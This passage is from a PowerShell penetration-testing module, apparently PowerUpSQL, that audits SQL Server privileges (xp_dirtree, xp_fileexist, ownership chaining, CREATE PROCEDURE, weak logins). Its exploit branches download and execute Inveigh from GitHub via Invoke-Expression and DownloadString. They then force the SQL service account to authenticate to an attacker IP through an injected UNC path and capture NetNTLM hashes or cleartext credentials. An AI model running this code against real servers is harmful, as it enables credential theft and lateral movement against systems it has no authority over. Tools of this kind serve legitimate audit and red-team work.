                                $path = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))

                                # Sent unc path to attacker's Ip
                                Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\$path..."
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$AttackerIp\$path'" -TimeOut 10 -SuppressVerbose

								# Sleep for $Timeout seconds to ensure that slow connections make it back to the listener
								Write-Verbose -Message "$Instance : - Sleeping for $TimeOut seconds to ensure the hash comes back"
                                Start-Sleep -s $TimeOut
                                
                                # Stop sniffing and print password hashes
                                $null = Stop-Inveigh
                                Write-Verbose -Message "$Instance : - Stopped sniffing."

                                $HashType = ''
                                $Hash = ''

                                [string]$PassCleartext = Get-Inveigh -Cleartext
                                if($PassCleartext)
                                {
                                    $HashType = 'Cleartext'
                                    $Hash = $PassCleartext
                                }

                                [string]$PassNetNTLMv1 = Get-Inveigh -NTLMv1
                                if($PassNetNTLMv1)
                                {
                                    $HashType = 'NetNTLMv1'
                                    $Hash = $PassNetNTLMv1
                                }

                                [string]$PassNetNTLMv2 = Get-Inveigh -NTLMv2
                                if($PassNetNTLMv2)
                                {
                                    $HashType = 'NetNTLMv2'
                                    $Hash = $PassNetNTLMv2
                                }

                                if($Hash)
                                {
                                    # Update Status
                                    Write-Verbose -Message "$Instance : - Recovered $HashType hash:"
                                    Write-Verbose -Message "$Instance : - $Hash"
                                    $Exploited = 'Yes'

                                    $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database. Recovered password hash! Hash type = $HashType;Hash = $Hash"
                                }
                                else
                                {
                                    # Update Status
                                    $Exploited = 'No'
                                    $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database.  xp_dirtree Executed, but no password hash was recovered."
                                }

                                # Clear inveigh cache
                                $null = Clear-Inveigh
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - Inveigh could not be loaded."
                                # Update status
                                $Exploited = 'No'
                                $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database, but Inveigh could not be loaded so no password hashes could be recovered."
                            }
                        }
                        else
                        {
                            # Update status
                            $Exploited = 'No'
                            $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database."
                        }
                    }
                    else
                    {
                        # Update status
                        $IsExploitable  = 'No'
                        $Details = "The $PrincipalName principal has EXECUTE privileges the xp_dirtree procedure in the master database."
                    }
                }

                # Add record
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No logins were found with the EXECUTE privilege on xp_dirtree."
        }

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - XP_DIRTREE"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}

Function Invoke-SQLAuditPrivXpFileexist
{
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit,

        [Parameter(Mandatory = $false,
        HelpMessage = 'IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.')]
        [string]$AttackerIp,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Time in second to way for hash to be captured.')]
        [int]$TimeOut = 5
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - xp_fileexist"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_fileexist."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        # Grab server, login, and role information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $CurrentLogin = $ServerInfo.CurrentLogin
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin
        $CurrentPrincpalList += 'Public'
        $CurrentLoginRoles | ForEach-Object -Process {
            $CurrentPrincpalList += $_.RolePrincipalName
        }

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Audit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Excessive Privilege - Execute xp_fileexist'
        $Description   = 'xp_fileexist is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-2014. Xp_dirtree can be used to force the SQL Server service account to authenticate to a remote attacker.  The service account password hash can then be captured + cracked or relayed to gain unauthorized access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or managed account isnt being used.  Thats because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.'
        $Remediation   = 'Remove EXECUTE privileges on the xp_fileexist procedure for non administrative logins and roles.  Example command: REVOKE EXECUTE ON xp_fileexist to Public'
        $Severity      = 'Medium'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = 'Crack the password hash offline or relay it to another system.'
        $Details       = ''
        $Reference     = 'https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Get users and roles that execute xp_fileexist
        $DirTreePrivs = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName master -SuppressVerbose | Where-Object -FilterScript {
            $_.ObjectName -eq 'xp_fileexist' -and $_.PermissionName -eq 'EXECUTE' -and $_.statedescription -eq 'grant'
        }

        # Update vulnerable status
        if($DirTreePrivs)
        {
            # Status user
            Write-Verbose -Message "$Instance : - The $PrincipalName principal has EXECUTE privileges on xp_fileexist."

            $IsVulnerable  = 'Yes'
            $DirTreePrivs |
            ForEach-Object {
                $PrincipalName = $DirTreePrivs.PrincipalName

                # Check if current login can exploit
                $CurrentPrincpalList |
                ForEach-Object {
                    $PrincipalCheck = $_

                    if($PrincipalName -eq $PrincipalCheck)
                    {
                        $IsExploitable  = 'Yes'

                        # Check if the current process has elevated privs
                        # https://msdn.microsoft.com/en-us/library/system.security.principal.windowsprincipal(v=vs.110).aspx
                        $CurrentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                        $prp = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($CurrentIdentity)
                        $adm = [System.Security.Principal.WindowsBuiltInRole]::Administrator
                        $IsAdmin = $prp.IsInRole($adm)
                        if (-not $IsAdmin)
                        {
                            Write-Verbose -Message "$Instance : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh."
                            $IAMADMIN = 'No'
                        }
                        else
                        {
                            Write-Verbose -Message "$Instance : - You have Administrator rights. Inveigh will be loaded."
                            $IAMADMIN = 'Yes'
                        }

                        # Get IP of current system
                        if(-not $AttackerIp)
                        {
                            $AttackerIp = (Test-Connection -ComputerName 127.0.0.1 -Count 1 |
                            Select-Object -ExpandProperty Ipv4Address |
                            Select-Object -Property IPAddressToString -ExpandProperty IPAddressToString)

                            if($AttackerIp -eq '127.0.0.1')
                            {
                                $AttackerIp = Get-WmiObject -Class win32_networkadapterconfiguration -Filter "ipenabled = 'True'" -ComputerName $env:COMPUTERNAME |
                                Select-Object -First 1 -Property @{
                                    Name       = 'IPAddress'
                                    Expression = {
                                        [regex]$rx = '(\d{1,3}(\.?)){4}'; $rx.matches($_.IPAddress)[0].Value
                                    }
                                } |
                                Select-Object -Property IPaddress -ExpandProperty IPAddress -First 1
                            }
                        }

                        # Check for exploit flag
                        if($IAMADMIN -eq 'Yes')
                        {
                            # Attempt to load Inveigh from file
                            #$InveighSrc = Get-Content .\scripts\Inveigh.ps1 -ErrorAction SilentlyContinue
                            #Invoke-Expression($InveighSrc)

                            # Attempt to load Inveigh via reflection
                            Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1')

                            $TestIt = Test-Path -Path Function:\Invoke-Inveigh
                            if($TestIt -eq 'True')
                            {
                                Write-Verbose -Message "$Instance : - Inveigh loaded."

                                # Get IP of SQL Server instance
                                $InstanceIP = [System.Net.Dns]::GetHostAddresses($ComputerName)

                                # Start sniffing for hashes from that IP
                                Write-Verbose -Message "$Instance : - Start sniffing..."
                                $null = Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -IP $AttackerIp

                                # Randomized 5 character file name
                                $path = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))

                                # Sent unc path to attacker's Ip
                                Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\$path..."
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_fileexist '\\$AttackerIp\$path'" -TimeOut 10 -SuppressVerbose

								# Sleep for $Timeout seconds to ensure that slow connections make it back to the listener
								Write-Verbose -Message "$Instance : - Sleeping for $TimeOut seconds to ensure the hash comes back"
                                Start-Sleep -s $TimeOut

                                # Stop sniffing and print password hashes
                                $null = Stop-Inveigh
                                Write-Verbose -Message "$Instance : - Stopped sniffing."

                                $HashType = ''
                                $Hash = ''

                                [string]$PassCleartext = Get-Inveigh -Cleartext
                                if($PassCleartext)
                                {
                                    $HashType = 'Cleartext'
                                    $Hash = $PassCleartext
                                }

                                [string]$PassNetNTLMv1 = Get-Inveigh -NTLMv1
                                if($PassNetNTLMv1)
                                {
                                    $HashType = 'NetNTLMv1'
                                    $Hash = $PassNetNTLMv1
                                }

                                [string]$PassNetNTLMv2 = Get-Inveigh -NTLMv2
                                if($PassNetNTLMv2)
                                {
                                    $HashType = 'NetNTLMv2'
                                    $Hash = $PassNetNTLMv2
                                }

                                if($Hash)
                                {
                                    # Update Status
                                    Write-Verbose -Message "$Instance : - Recovered $HashType hash:"
                                    Write-Verbose -Message "$Instance : - $Hash"
                                    $Exploited = 'Yes'
                                    $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database. Recovered password hash! Hash type = $HashType;Hash = $Hash"
                                }
                                else
                                {
                                    # Update Status
                                    $Exploited = 'No'
                                    $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database.  xp_fileexist Executed, but no password hash was recovered."
                                }

                                # Clear inveigh cache
                                $null = Clear-Inveigh
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - Inveigh could not be loaded."
                                # Update status
                                $Exploited = 'No'
                                $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database, but Inveigh could not be loaded so no password hashes could be recovered."
                            }
                        }
                        else
                        {
                            # Update status
                            $Exploited = 'No'
                            $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database."
                        }
                    }
                    else
                    {
                        # Update status
                        $IsExploitable  = 'No'
                        $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database."
                    }
                }

                # Add record
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
            }      
        }else{
            Write-Verbose -Message "$Instance : - No logins were found with the EXECUTE privilege on xp_fileexist."
        }
    }

    End
    {
        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_fileexist"

        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}



Function Invoke-SQLAuditPrivDbChaining
{
   
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Audit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Excessive Privilege - Database Ownership Chaining'
        $Description   = 'Ownership chaining was found enabled at the server or database level.  Enabling ownership chaining can lead to unauthorized access to database resources.'
        $Remediation   = "Configured the affected database so the 'is_db_chaining_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING ON' is used enable chaining.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING OFF;' can be used to disable chaining."
        $Severity      = 'Low'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = 'There is not exploit available at this time.'
        $Details       = ''
        $Reference     = 'https://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx,https://msdn.microsoft.com/en-us/library/bb669059(v=vs.110).aspx '
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Select links configured with static credentials

        if($NoDefaults)
        {
            $ChainDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -NoDefaults -SuppressVerbose | Where-Object -FilterScript {
                $_.is_db_chaining_on -eq 'True'
            }
        }
        else
        {
            $ChainDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
                $_.is_db_chaining_on -eq 'True'
            }
        }

        # Update vulnerable status
        if($ChainDatabases)
        {
            $IsVulnerable  = 'Yes'
            $ChainDatabases |
            ForEach-Object -Process {
                $DatabaseName = $_.DatabaseName
				if($DatabaseName -ne 'master' -and $DatabaseName -ne 'tempdb' -and $DatabaseName -ne 'msdb')
				{
					Write-Verbose -Message "$Instance : - The database $DatabaseName has ownership chaining enabled."
					$Details = "The database $DatabaseName was found configured with ownership chaining enabled."
					$null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
				}
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No non-default databases were found with ownership chaining enabled."
        }

        # Check for server wide setting
        $ServerCheck = Get-SQLServerConfiguration -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Name -like '*chain*' -and $_.config_value -eq 1
        }
        if($ServerCheck)
        {
            $IsVulnerable  = 'Yes'
            Write-Verbose -Message "$Instance : - The server configuration 'cross db ownership chaining' is set to 1.  This can affect all databases."
            $Details = "The server configuration 'cross db ownership chaining' is set to 1.  This can affect all databases."
            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
        }


        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


Function Invoke-SQLAuditPrivCreateProcedure
{
   
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED"
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
        }

        # Grab server, login, and role information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $CurrentLogin = $ServerInfo.CurrentLogin
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance  -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin -SuppressVerbose
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin
        $CurrentPrincpalList += 'Public'
        $CurrentLoginRoles |
        ForEach-Object -Process {
            $CurrentPrincpalList += $_.RolePrincipalName
        }

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Audit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'PERMISSION - CREATE PROCEDURE'
        $Description   = 'The login has privileges to create stored procedures in one or more databases.  This may allow the login to escalate privileges within the database.'
        $Remediation   = 'If the permission is not required remove it.  Permissions are granted with a command like: GRANT CREATE PROCEDURE TO user, and can be removed with a command like: REVOKE CREATE PROCEDURE TO user'
        $Severity      = 'Medium'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "No exploit is currently available that will allow $CurrentLogin to become a sysadmin."
        $Details       = ''
        $Dependancies = ''
        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms187926.aspx?f=255&MSPPError=-2147217396'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Get all CREATE PROCEDURE grant permissions for all accessible databases
        $Permissions = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -SuppressVerbose | Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PermissionName 'CREATE PROCEDURE'

        if($Permissions)
        {
            # Iterate through each current login and their associated roles
            $CurrentPrincpalList|
            ForEach-Object -Process {
                # Check if they have the CREATE PROCEDURE grant
                $CurrentPrincipal = $_
                $Permissions |
                ForEach-Object -Process {
                    $AffectedPrincipal = $_.PrincipalName
                    $AffectedDatabase = $_.DatabaseName

                    if($AffectedPrincipal -eq $CurrentPrincipal)
                    {
                        # Set flag to vulnerable
                        $IsVulnerable  = 'Yes'
                        Write-Verbose -Message "$Instance : - The $AffectedPrincipal principal has the CREATE PROCEDURE permission in the $AffectedDatabase database."
                        $Details = "The $AffectedPrincipal principal has the CREATE PROCEDURE permission in the $AffectedDatabase database."

                        # -----------------------------------------------------------------
                        # Check for exploit dependancies
                        # Note: Typically secondary configs required for dba/os execution
                        # -----------------------------------------------------------------
                        $HasAlterSchema = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PermissionName 'ALTER' -PermissionType 'SCHEMA' -PrincipalName $CurrentPrincipal -DatabaseName $AffectedDatabase  -SuppressVerbose
                        if($HasAlterSchema)
                        {
                            $IsExploitable = 'Yes'
                            $Dependancies = " $CurrentPrincipal also has ALTER SCHEMA permissions so procedures can be created."
                            Write-Verbose -Message "$Instance : - Dependancies were met: $CurrentPrincipal has ALTER SCHEMA permissions."

                            # Add to report example
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, "$Details$Dependancies", $Reference, $Author)
                        }
                        else
                        {
                            $IsExploitable = 'No'

                            # Add to report example
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                        }

                        # -----------------------------------------------------------------
                        # Exploit Vulnerability
                        # Note: Add the current user to sysadmin fixed server role
                        # -----------------------------------------------------------------

                        if($Exploit -and $IsExploitable -eq 'Yes')
                        {
                            Write-Verbose -Message "$Instance : - No server escalation method is available at this time."
                        }
                    }
                }
            }
        }
        else
        {
            # Status user
            Write-Verbose -Message "$Instance : - The current login doesn't have the CREATE PROCEDURE permission in any databases."
        }

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}



Function Invoke-SQLAuditWeakLoginPw
{
   
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Known SQL Server login to fuzz logins with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Username to test.')]
        [string]$TestUsername = 'sa',

        [Parameter(Mandatory = $false,
        HelpMessage = 'Path to list of users to use.  One per line.')]
        [string]$UserFile,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Known SQL Server password to fuzz logins with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server password to attempt to login with.')]
        [string]$TestPassword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Path to list of passwords to use.  One per line.')]
        [string]$PassFile,

        [Parameter(Mandatory = $false,
        HelpMessage = 'User is tested as pass by default. This setting disables it.')]
        [switch]$NoUserAsPass,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't attempt to enumerate logins from the server.")]
        [switch]$NoUserEnum,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of Principal IDs to fuzz.')]
        [string]$FuzzNum = 10000,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Weak Login Password"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Weak Login Password."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName
        $CurrentUSerSysadmin = $ServerInfo.IsSysadmin

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Audit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
